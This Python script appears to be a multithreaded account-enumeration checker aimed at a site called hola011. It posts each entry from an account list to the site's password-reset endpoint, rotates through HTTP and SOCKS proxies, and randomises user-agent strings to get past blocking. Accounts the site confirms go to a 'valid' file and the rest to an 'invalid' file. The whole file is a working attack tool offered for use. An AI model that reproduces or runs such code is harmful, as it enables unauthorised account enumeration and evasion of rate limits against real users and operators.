class TPCTTime2Refill:
    from requests import Session, adapters
    from requests import exceptions as requestsExceptions
    from urllib3 import exceptions as urllibExceptions

    def __init__(self, accountsListPath: str, proxiesListPath: str, timeSleep: int, timeout: int, validOutputPath: str,
                 nonValidOutputPath: str, finishedPath: str, threadsNumber):
        from os import path, stat
        self.website = 'hola011'
        self.path = path
        self.stat = stat
        self.accountsListPath = accountsListPath
        self.proxiesListPath = proxiesListPath
        self.timeSleep = timeSleep
        self.maxThreadsNumber = threadsNumber if threadsNumber else 100
        self.timeout = timeout
        self.Pool = dict(started=False, threadsPool=list(), threadsPoolCounter=0)
        self.validOutput = open(validOutputPath, 'a+') if validOutputPath else open('valid.txt', 'a+')
        self.nonValidOutput = open(nonValidOutputPath, 'a+') if nonValidOutputPath else open('invalid.txt', 'a+')
        self.finishedOutput = open(finishedPath, 'a+') if finishedPath else open('finished.txt', 'a+')
        self.accountsList = None
        self.proxiesList = None
        self.openWebsite = None
        self.printingThreadVar = None
        self.PoolRemoverVar = None
        self.totalChecked = False
        self.stopPrinting = False
        self.workingCounter = 0
        self.nonWorkingCounter = 0
        self.finishedCounter = 0
        self.proxiesCounter = 0
        self.workingProxyCounter = 0
        self.status = 'starting'
        self.pooling = 'False'
        self.generateProxiesList()
        self.generateAccountsList()
        self.iterator()

    def generateAccountsList(self):
        if self.path.exists(self.accountsListPath) and self.stat(self.accountsListPath).st_size != 0:
            self.accountsList = open(self.accountsListPath, 'r+')
        else:
            raise FileNotFoundError('Please enter valid accounts list path')

    def generateProxiesList(self):
        if not self.proxiesListPath:
            self.proxiesCounter = 1
            self.proxiesList = ['0.0.0.0:80']
            return None

        if self.path.exists(self.proxiesListPath) and self.stat(self.proxiesListPath).st_size != 0:
            self.proxiesList = open(self.proxiesListPath)
            file = self.proxiesList
            self.proxiesList = list(set(self.proxiesList.readlines()))
            self.proxiesCounter = len(self.proxiesList)
            file.close()
        else:
            raise FileNotFoundError('Please enter valid proxiesList path')

    def generateSession(self, session):
        if session is None:
            return None

        from random import randint, uniform
        userAgent = [
                'Mozilla/5.0 (Windows NT %s; Win64; x64) '
                'AppleWebKit/%s (KHTML, like Gecko) '
                'Chrome/%s.%s.%s.135 Safari/%s Edge/%s' % (uniform(6, 10),
                                                           uniform(200, 500),
                                                           randint(20, 50),
                                                           randint(0, 10),
                                                           randint(1000, 3000), uniform(200, 500), uniform(10, 15)),
                'Mozilla/%s (X%s; Ubuntu; Linux x86_64; rv:%s)'
                ' Gecko/%s Firefox/%s.%s.%s' % (uniform(1, 10),
                                                randint(1, 20),
                                                randint(1, 20),
                                                randint(20000000, 21000000), randint(1, 20), randint(1, 10), randint(1, 20)),
                'Mozilla/%s (Windows NT %s; WOW64) '
                'AppleWebKit/%s (KHTML, like Gecko) '
                'Chrome/%s.%s.%s.%s Safari/%s' % (uniform(1, 20), uniform(1, 20),
                                                  uniform(200, 500), randint(1, 50), randint(0, 10),
                                                  randint(1000, 2000), randint(100, 200), uniform(200, 1000))]

        session.headers['User-Agent'] = userAgent[randint(0, len(userAgent) - 1)]
        session.headers['host'] = 'www.hola011.com'
        session.headers[
            'accept'] = 'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01'
        session.headers['accept-encoding'] = 'gzip, deflate, br'
        session.headers['accept-language'] = 'en-US,en;q=0.5'
        session.headers['keep-alive'] = 'keep-alive'
        session.headers['referer'] = 'https://www.hola011.com/login/'
        session.headers['x-requested-with'] = 'XMLHttpRequest'

        return session

    def checkProxy(self, proxy: str):
        if not proxy:
            return None

        self.adapters.DEFAULT_RETRIES = 1
        proxy = proxy.strip()
        session = self.Session()
        session.proxy = proxy

        self.status = 'Proxy %s' % proxy

        def checkHttp():
            try:
                session.proxies = dict(http='http://' + proxy, https='http://' + proxy) if proxy != '0.0.0.0:80' \
                    else None
                self.openWebsite = 'https://www.' + self.website + '.com'
                session.get(self.openWebsite, timeout=float(self.timeout), stream=True)
                return session
            except KeyboardInterrupt:
                raise
            except Exception as e:
                for x in e.args:
                    if isinstance(x, self.urllibExceptions.MaxRetryError) or isinstance(x, self.urllibExceptions.ProtocolError):
                        if isinstance(x.args[0], self.requestsExceptions.ReadTimeout):
                            return session
                return None

        def checkHttps():
            try:
                session.proxies = dict(http='http://' + proxy, https='https://' + proxy) if proxy != '0.0.0.0:80' \
                    else None
                self.openWebsite = 'https://www.' + self.website + '.com'
                session.get(self.openWebsite, timeout=float(self.timeout), stream=True)
                return session
            except KeyboardInterrupt:
                raise
            except Exception as e:
                for x in e.args:
                    if isinstance(x, self.urllibExceptions.MaxRetryError) or isinstance(x, self.urllibExceptions.ProtocolError):
                        if isinstance(x.args[0], self.requestsExceptions.ReadTimeout):
                            return session
                return None

        def checkSock4():

            try:
                session.proxies = dict(http='socks4://' + proxy, https='socks4://' + proxy) if proxy != '0.0.0.0:80' \
                    else None
                self.openWebsite = 'https://' + self.website + '.com'
                session.get(self.openWebsite, timeout=float(self.timeout), stream=True)
                return session
            except KeyboardInterrupt:
                raise
            except Exception as e:
                for x in e.args:
                    if isinstance(x, self.urllibExceptions.MaxRetryError) or isinstance(x, self.urllibExceptions.ProtocolError):
                        if isinstance(x.args[0], self.requestsExceptions.ReadTimeout):
                            return session
                return None

        def checkSock5():
            try:
                session.proxies = dict(http='socks5://' + proxy, https='socks5://' + proxy) if proxy != '0.0.0.0:80' \
                    else None
                self.openWebsite = 'https://' + self.website + '.com'
                session.get(self.openWebsite, timeout=float(self.timeout), stream=True)
                return session
            except KeyboardInterrupt:
                raise
            except Exception as e:
                for x in e.args:
                    if isinstance(x, self.urllibExceptions.MaxRetryError) or \
                            isinstance(x, self.urllibExceptions.ProtocolError):
                        if isinstance(x.args[0], self.requestsExceptions.ReadTimeout):
                            return session
                return None

        httpResult = checkHttp()
        httpResult = checkHttps() if not httpResult else httpResult
        httpResult = checkSock4() if not httpResult else httpResult
        httpResult = checkSock5() if not httpResult else httpResult

        return httpResult, proxy

    def generateProxy(self):
        result = self.proxiesList[self.workingProxyCounter % self.proxiesCounter] if self.proxiesCounter else None
        self.workingProxyCounter += 1 if self.proxiesCounter else 0
        return result

    def checkAccount(self, account, session):
        if not session or not account:
            return None

        from urllib3 import exceptions as urllib3Exception
        session.adapters.DEFAULT_RETRIES = 5
        self.status = 'checking %s' % account

        try:
            resp = session.post(self.openWebsite + '/support/requestpassword',
                                data={'RequestPasswordForm[credential]': account,
                                      'yt0': 'Submit'}, timeout=self.timeout, stream=True)
            if resp:
                return resp.json()['success']
        except KeyboardInterrupt:
            raise
        except ConnectionError as e:
            for x in e.args:
                if isinstance(x, urllib3Exception.ProtocolError):
                    if isinstance(x.args[0], ConnectionResetError):
                        if session.proxy in self.proxiesList:
                            self.proxiesList.remove(session.proxy)
                            self.proxiesCounter -= 1 if self.proxiesCounter > 0 else 0
        except:
            pass
        return None

    def checkerThread(self, account):
        from time import sleep
        account = account.strip()
        if not account:
            return

        session = None
        checked = None

        while not checked or not session:
            proxy = self.generateProxy()
            if proxy:
                session, proxy = self.checkProxy(proxy)
            else:
                return

            if session is None:
                self.proxiesList.remove(proxy) if proxy in self.proxiesList else None
                self.proxiesCounter -= 1 if self.proxiesCounter > 0 else 0
                continue

            session = self.generateSession(session)
            checked = self.checkAccount(account, session)

            if checked is None:
                continue
            elif checked:
                self.validOutput.write("%s\n" % account)
                self.validOutput.flush()
                self.workingCounter += 1
            else:
                self.nonValidOutput.write("%s\n" % account)
                self.nonValidOutput.flush()
                self.nonWorkingCounter += 1

            self.finishedCounter += 1
            self.finishedOutput.write("%s\n" % account)
            self.finishedOutput.flush()
            sleep(self.timeSleep)
            return

    def threadPoolRemove(self):
        counter = 0
        while self.Pool['threadsPool'] or not self.totalChecked or not self.Pool['started']:
            thread = self.Pool['threadsPool'][counter % len(self.Pool['threadsPool'])] if self.Pool['threadsPool'] \
                else None
            if thread and not thread.is_alive():
                self.Pool['threadsPool'].remove(thread)
                self.Pool['threadsPoolCounter'] -= 1
            elif thread and thread.is_alive():
                counter += 1

        if self.Pool['started'] and self.totalChecked and not self.Pool['threadsPool']:
            self.Pool['started'] = False
            self.Pool['threadsPoolCounter'] = 0
            self.validOutput.close()
            self.nonValidOutput.close()
            self.finishedOutput.close()
            self.stopPrinting = True
            self.printingThreadVar.join()

    def printingThread(self):
        finishedCounter = 0
        status = ''
        pooling = 'True'
        proxyCounter = 0
        threadsCounter = 0
        while not self.stopPrinting:
            if finishedCounter != self.finishedCounter or status != self.status or pooling != self.pooling \
                    or proxyCounter != self.proxiesCounter or (threadsCounter != self.Pool['threadsPoolCounter']
                                                               and self.status != 'starting'):
                print('Valid Pins:', self.workingCounter,
                      '- Invalid Pins:', self.nonWorkingCounter,
                      '- Total Pins:', self.finishedCounter,
                      '- Proxies:', self.proxiesCounter,
                      '- status:', self.status,
                      '- Pooling:', self.pooling,
                      '- Threads:', self.Pool['threadsPoolCounter'])
                finishedCounter = self.finishedCounter
                status = self.status
                pooling = self.pooling
                proxyCounter = self.proxiesCounter
                threadsCounter = self.Pool['threadsPoolCounter']

    def iterator(self):
        from threading import Thread
        self.PoolRemoverVar = Thread(target=self.threadPoolRemove, daemon=True)
        self.printingThreadVar = Thread(target=self.printingThread, daemon=True)
        self.PoolRemoverVar.start()
        self.printingThreadVar.start()

        for account in self.accountsList:
            while self.proxiesCounter:
                try:
                    if self.Pool['threadsPoolCounter'] < self.maxThreadsNumber:
                        self.pooling = 'False'
                        proxyThread = Thread(name=account.rstrip(),
                                             target=self.checkerThread, args=(account,), daemon=True)
                        proxyThread.start()
                        self.Pool['started'] = True
                        self.Pool['threadsPool'].append(proxyThread)
                        self.Pool['threadsPoolCounter'] += 1
                        break
                    else:
                        self.pooling = 'True'
                except RuntimeError:
                    self.pooling = 'Waiting'
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    print('an error occurred in main iterator', e.args)
            else:
                self.totalChecked = True
                self.PoolRemoverVar.join()
                print('all Proxies has been block')
                data = self.accountsList.read()
                self.accountsList.seek(0)
                self.accountsList.truncate()
                self.accountsList.write(data)
                self.accountsList.close()
                break


def start():
    helloMessage = r'''
    _________ _______  _______ _________  __________________ _______  _______  _______  _______  _______  _______ _________ _        _       
    \__   __/(  ____ )(  ____ \\__   __/  \__   __/\__   __/(       )(  ____ \/ ___   )(  ____ )(  ____ \(  ____ \\__   __/( \      ( \      
       ) (   | (    )|| (    \/   ) (        ) (      ) (   | () () || (    \/\/   )  || (    )|| (    \/| (    \/   ) (   | (      | (      
       | |   | (____)|| |         | |        | |      | |   | || || || (__        /   )| (____)|| (__    | (__       | |   | |      | |      
       | |   |  _____)| |         | |        | |      | |   | |(_)| ||  __)     _/   / |     __)|  __)   |  __)      | |   | |      | |      
       | |   | (      | |         | |        | |      | |   | |   | || (       /   _/  | (\ (   | (      | (         | |   | |      | |      
       | |   | )      | (____/\   | |        | |   ___) (___| )   ( || (____/\(   (__/\| ) \ \__| (____/\| )      ___) (___| (____/\| (____/\
       )_(   |/       (_______/   )_(        )_(   \_______/|/     \|(_______/\_______/|/   \__/(_______/|/       \_______/(_______/(_______/
       '''
    print(helloMessage)
    while True:
        accountsListPath = input('Please enter accounts list Path: ').strip().strip('\'"')
        proxylistPath = input('Please enter proxies Path: ').strip().strip('\'"')
        validOutput = input('please enter valid output file path: ').strip().strip('\'"')
        invalidOutput = input('please enter invalid output file path: ').strip().strip('\'"')
        finishedOutput = input('please enter finished output file path: ').strip().strip('\'"')
        sleepTime = input('Please enter sleep Time: ').strip()
        proxyTimeout = input('Please enter timeout to change proxy: ').strip()
        threadsNumber = input('please enter threads number: ').strip()
        try:
            sleepTime = float(sleepTime) if sleepTime.isnumeric() else 0
            proxyTimeout = float(proxyTimeout) if proxyTimeout.isnumeric() else 10
            threadsNumber = int(threadsNumber) if threadsNumber.isnumeric() else 100
            TPCTTime2Refill(accountsListPath, proxylistPath, sleepTime, proxyTimeout,
                            validOutput, invalidOutput, finishedOutput, threadsNumber)
        except KeyboardInterrupt:
            raise
        except Exception as e:
            print('[Error %s]' % e.args)


start()
